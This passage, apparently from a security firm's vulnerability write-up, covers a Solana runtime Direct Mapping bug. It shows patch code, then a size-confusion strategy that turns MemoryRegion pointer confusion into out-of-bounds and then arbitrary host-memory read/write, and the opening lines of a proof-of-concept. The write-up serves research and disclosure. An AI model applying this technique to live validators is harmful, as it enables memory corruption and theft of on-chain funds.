</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">14</span><span>    </span><span class="token token" style="color:#cc99cd">if</span><span> </span><span class="token token" style="color:#cc99cd">let</span><span> </span><span class="token token" style="color:#f8c555">Some</span><span class="token token" style="color:#ccc">(</span><span>region</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> data_region </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">15</span><span>        </span><span class="token token" style="color:#cc99cd">match</span><span> </span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">16</span><span>            region</span><span class="token token" style="color:#ccc">.</span><span>state</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">get</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">17</span><span>            callee_account</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">can_data_be_changed</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">is_ok</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">18</span><span>        </span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">19</span><span>            </span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f8c555">MemoryState</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Readable</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f08d49">true</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">20</span><span>                </span><span class="token token" style="color:#999">// If the account is still shared it means it wasn&#x27;t written to yet during this</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">21</span><span>                </span><span class="token token" style="color:#999">// transaction. We map it as CoW and it&#x27;ll be copied the first time something</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">22</span><span>                </span><span class="token token" style="color:#999">// tries to write into it.</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">23</span><span>                </span><span class="token token" style="color:#cc99cd">if</span><span> callee_account</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">is_shared</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">24</span><span>                    </span><span class="token token" style="color:#cc99cd">let</span><span> index_in_transaction </span><span class="token token" style="color:#67cdcc">=</span><span> callee_account</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">get_index_in_transaction</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">25</span>                    region
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">26</span><span>                        </span><span class="token token" style="color:#ccc">.</span><span>state
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">27</span><span>                        </span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">set</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f8c555">MemoryState</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Cow</span><span class="token token" style="color:#ccc">(</span><span>index_in_transaction </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">28</span><span>                </span><span class="token token" style="color:#ccc">}</span><span> </span><span class="token token" style="color:#cc99cd">else</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">29</span><span>                    region</span><span class="token token" style="color:#ccc">.</span><span>state</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">set</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f8c555">MemoryState</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Writable</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">30</span><span>                </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">31</span><span>            </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">32</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">33</span><span>            </span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f8c555">MemoryState</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Writable</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#f8c555">MemoryState</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Cow</span><span class="token token" style="color:#ccc">(</span><span>_</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f08d49">false</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">34</span><span>                region</span><span class="token token" style="color:#ccc">.</span><span>state</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">set</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f8c555">MemoryState</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Readable</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">35</span><span>            </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">36</span><span>            _ </span><span class="token token" style="color:#67cdcc">=&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">37</span><span>        </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">38</span><span>    </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">39</span><span>    </span><span class="token token" style="color:#cc99cd">let</span><span> realloc_region </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">account_realloc_region</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">40</span><span>        memory_mapping</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">41</span><span>        </span><span class="token token" style="color:#67cdcc">*</span><span>vm_data_addr</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">42</span><span>        </span><span class="token token" style="color:#67cdcc">*</span><span>original_data_len</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">43</span><span>        is_loader_deprecated</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">44</span><span>    </span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#67cdcc">?</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">45</span><span>    </span><span class="token token" style="color:#cc99cd">if</span><span> </span><span class="token token" style="color:#cc99cd">let</span><span> </span><span class="token token" style="color:#f8c555">Some</span><span class="token token" style="color:#ccc">(</span><span>region</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> realloc_region </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">46</span>        region
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">47</span><span>            </span><span class="token token" style="color:#ccc">.</span><span>state
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">48</span><span>            </span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">set</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#cc99cd">if</span><span> callee_account</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">can_data_be_changed</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">is_ok</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">49</span><span>                </span><span class="token token" style="color:#f8c555">MemoryState</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Writable</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">50</span><span>            </span><span class="token token" style="color:#ccc">}</span><span> </span><span class="token token" style="color:#cc99cd">else</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">51</span><span>                </span><span class="token token" style="color:#f8c555">MemoryState</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Readable</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">52</span><span>            </span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">53</span><span>    </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">54</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">55</span><span>    </span><span class="token token" style="color:#f8c555">Ok</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">56</span><span></span><span class="token token" style="color:#ccc">}</span></code></div></div></pre>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">The idea of the patch is that when a CPI happens, changes to the <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">owner</code> of an account may be updated and flushed to <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">TransactionContext</code>. One example of this is when creating a new token account. The caller is expected to transfer ownership of an empty account to the token program, and the token program will then initialize the token account with relevant data. Obviously we should no longer allow the caller program to directly write the token account data after the token program has taken ownership of it. With Direct Mapping enabled, this means <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> state must be updated accordingly.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">At first glance, the patch seemed unrelated to our finding. But unfortunately, updating <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">state</code> means that while we may point the host pointer of an originally writable <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> to some unwritable account data, after CPI finishes, the <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> will just end up being marked as readonly. This kills our exploit.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Still, <strong class="font-semibold text-white">the vulnerability itself hadn&#x27;t been patched</strong>. We just need to bypass the new checks, and that is exactly what we, Anatomist Security, are best at. With years of deep security research and CTF experience, we specialize in turning dead ends into breakthroughs.</p>
<h2 class="text-3xl sm:text-4xl mt-8 mb-3 pb-2 border-b border-white/10 text-white text-glow">New Exploitation Strategy</h2>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">So back to the drawing board, what else can we do with our bug? The essence of the bug is confusion of <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion.host_addr</code>. In other words, we could overwrite an arbitrary <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code>&#x27;s <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">host_addr</code> with another <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code>&#x27;s <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">host_addr</code>.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">While our first attempt was to change the <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">host_addr</code> of a writable <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> to some readonly account data buffer, it is definitely not the only way to wield the bug. Our second idea is, instead of trying to write to a readonly account data buffer, what if we changed the <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">host_addr</code> of a writable <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> to the backing buffer of another writable <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> that has a different length?</p>
<h3 class="text-2xl sm:text-3xl mt-6 mb-2 text-white">The New Attack Vector: Size Confusion</h3>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">This new idea led us to a completely different exploitation approach. Instead of trying to bypass permission checks, we could exploit size differences between different account buffers for out-of-bound read/write, a primitive commonly used in binary exploitation.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Consider two accounts, both writable by the attacker:</p>
<ul class="text-lg sm:text-xl py-2 text-pretty sm:text-justify text-white/70 list-disc pl-6">
<li class="my-2"><strong class="font-semibold text-white">SWAP</strong>: A small-sized buffer account with data length 0x100</li>
<li class="my-2"><strong class="font-semibold text-white">LEVERAGE</strong>: A bigger-sized buffer account, with data length 0x400, whose <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">host_addr</code> will be replaced to SWAP&#x27;s <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">host_addr</code></li>
</ul>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">If we could make <strong class="font-semibold text-white">LEVERAGE</strong> account&#x27;s <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> point to <strong class="font-semibold text-white">SWAP</strong> account&#x27;s buffer, by accessing <strong class="font-semibold text-white">LEVERAGE</strong> account&#x27;s virtual memory, we ends up touching <strong class="font-semibold text-white">SWAP</strong> account&#x27;s data buffer on the host. Since the <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> of <strong class="font-semibold text-white">LEVERAGE</strong> has a size of 0x400, larger than the size of the underlying host buffer of <strong class="font-semibold text-white">SWAP</strong>, once we go past the first 0x100 bytes of <strong class="font-semibold text-white">LEVERAGE</strong>&#x27;s virtual memory, it will map beyond the end of the <strong class="font-semibold text-white">SWAP</strong> data buffer. This gives us out-of-bounds read/write primitive on host memory.</p>
<h3 class="text-2xl sm:text-3xl mt-6 mb-2 text-white">From Limited OOB to Arbitrary read/write</h3>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">With this, we gain out-of-bounds read/write access to 0x300 bytes (0x400 - 0x100) after <strong class="font-semibold text-white">SWAP</strong>&#x27;s data buffer in host memory. However, this primitive is limited to a specific range. We need to make it more powerful.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">The idea is straightforward: since <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> structures also reside in host memory, we can scan the out-of-bounds region to locate other <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> structures. By modifying their <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">host_addr</code> fields to point to our target addresses, accessing the corresponding virtual memory provides arbitrary read/write access to those target addresses. We just need to spray a lot of writable accounts and make the size difference larger to increase the success rate.</p>
<h2 class="text-3xl sm:text-4xl mt-8 mb-3 pb-2 border-b border-white/10 text-white text-glow">Proof-of-Concept</h2>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Now, let&#x27;s take a deep dive into a PoC of how to exploit this vulnerability from the ground up.</p>
<h3 class="text-2xl sm:text-3xl mt-6 mb-2 text-white">Detailed Attack Steps</h3>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">The exploit requires three specific accounts with distinct purposes:</p>
<ul class="text-lg sm:text-xl py-2 text-pretty sm:text-justify text-white/70 list-disc pl-6">
<li class="my-2"><strong class="font-semibold text-white">SWAP</strong>: Small buffer account that serves as the target of the corrupted pointer. Its small buffer will be incorrectly mapped by SWAP&#x27;s large virtual space.</li>
<li class="my-2"><strong class="font-semibold text-white">POINTER</strong>: Pointer account whose <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion.host_addr</code> will be rewritten during memory scanning to point to arbitrary memory addresses. This account serves as our pointer pivot to achieve arbitrary read/write capability.</li>
<li class="my-2"><strong class="font-semibold text-white">LEVERAGE</strong>: Large buffer account whose <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion.host_addr</code> will be hijacked to point to SWAP&#x27;s smaller buffer, creating the size mismatch for out-of-bounds access.</li>
</ul>
<h4 class="text-xl sm:text-2xl mt-4 mb-2 text-white">Step 1: Account Preparation</h4>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">First, we want to trigger copy-on-write on both <strong class="font-semibold text-white">LEVERAGE</strong> and <strong class="font-semibold text-white">SWAP</strong> accounts and also resize <strong class="font-semibold text-white">LEVERAGE</strong> to 1 byte to make the code path later simpler.</p>
<pre><div class="relative my-6 border border-white/10 bg-black/60"><div class="absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase">:: <!-- -->RUST</div><div class="rounded-sm !bg-transparent !m-0" style="color:#ccc;background:#0a0a0a;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;border:1px solid rgba(255, 255, 255, 0.15);box-shadow:0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)"><code class="language-rust" style="white-space:pre;color:#e0e0e0;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">1</span><span class="token token" style="color:#999">// Trigger copy-on-write for dedicated buffers</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">2</span><span>accounts</span><span class="token token" style="color:#ccc">[</span><span>leverage_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>data</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">borrow_mut</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f08d49">0</span><span class="token token" style="color:#ccc">]</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">3</span><span>accounts</span><span class="token token" style="color:#ccc">[</span><span>swap_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>data</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">borrow_mut</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f08d49">0</span><span class="token token" style="color:#ccc">]</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">;</span><span> 
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">4</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">5</span><span></span><span class="token token" style="color:#999">// Resize LEVERAGE to simplify exploit logic</span><span>
